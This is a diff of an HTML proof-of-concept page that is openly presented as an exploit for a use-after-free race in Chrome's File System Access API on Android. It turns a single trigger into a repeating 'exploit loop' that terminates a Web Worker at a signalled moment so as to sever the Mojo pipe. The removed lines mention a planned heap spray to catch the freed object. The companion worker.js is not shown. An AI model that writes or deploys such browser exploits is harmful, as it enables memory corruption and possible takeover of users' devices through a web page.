@@ -1,36 +1,79 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>FileSystemAccess UAF PoC (Stock Chrome)</title>
+    <title>FileSystemAccess UAF PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: monospace; padding: 20px; }
+        #log { background: #eee; padding: 10px; height: 300px; overflow-y: scroll; border: 1px solid #ccc; }
+        button { padding: 15px; font-size: 16px; background: #d9534f; color: white; border: none; border-radius: 5px; }
+    </style>
 </head>
 <body>
     <h1>Standard Web API Race Trigger</h1>
-    <p>Testing on stock Android Chrome via OPFS and Web Workers.</p>
-    <button id="trigger">Trigger UAF</button>
+    <button id="trigger">Spam UAF Trigger</button>
+    <button id="stop">Stop</button>
+    
+    <h3>Execution Log:</h3>
+    <div id="log"></div>
 
     <script>
-        document.getElementById('trigger').onclick = async () => {
-            console.log("[*] Spawning Web Worker...");
-            
-            // Spawn the worker
-            const worker = new Worker('worker.js');
+        const logDiv = document.getElementById('log');
+        let isRunning = false;
 
-            // Listen for the exact moment to strike
-            worker.onmessage = (e) => {
-                if (e.data === "RACE_NOW") {
-                    console.log("[*] Received signal. Terminating worker instantly!");
-                    
-                    // This is the kill shot. Terminating the worker instantly severs
-                    // the Mojo Receiver pipe on the Browser process side, triggering
-                    // the disconnect handler while the Async Task A is still running.
+        function logMessage(msg) {
+            logDiv.innerHTML += msg + '<br>';
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        async function runRace() {
+            return new Promise((resolve) => {
+                const worker = new Worker('worker.js');
+
+                // Set a timeout just in case the worker hangs
+                const timer = setTimeout(() => {
                     worker.terminate();
-                    
-                    console.log("[+] Worker terminated. Mojo pipe dropped. Browser should crash in std::set::find().");
-                    
-                    // Spray the heap here to catch the freed object
-                    // sprayHeap();
-                }
-            };
+                    resolve();
+                }, 1000);
+
+                worker.onmessage = (e) => {
+                    if (e.data.type === 'log') {
+                        logMessage(e.data.msg);
+                    } else if (e.data.type === 'RACE_NOW') {
+                        // THE KILL SHOT: Terminate instantly to drop the Mojo pipe
+                        worker.terminate();
+                        clearTimeout(timer);
+                        logMessage("<span style='color:red;'>[+] Worker terminated. Pipe dropped.</span>");
+                        resolve();
+                    } else if (e.data.type === 'error') {
+                        logMessage("<span style='color:red;'>[-] Worker Error: " + e.data.msg + "</span>");
+                        worker.terminate();
+                        clearTimeout(timer);
+                        resolve();
+                    }
+                };
+            });
+        }
+
+        document.getElementById('trigger').onclick = async () => {
+            if (isRunning) return;
+            isRunning = true;
+            logMessage("[*] Starting exploit loop...");
+            
+            let attempts = 0;
+            while (isRunning) {
+                attempts++;
+                logMessage(`<br><b>--- Attempt ${attempts} ---</b>`);
+                await runRace();
+                
+                // Small delay to let the browser process garbage collection catch up
+                await new Promise(r => setTimeout(r, 50)); 
+            }
+        };
+
+        document.getElementById('stop').onclick = () => {
+            isRunning = false;
+            logMessage("[*] Stopped.");
         };
     </script>
 </body>
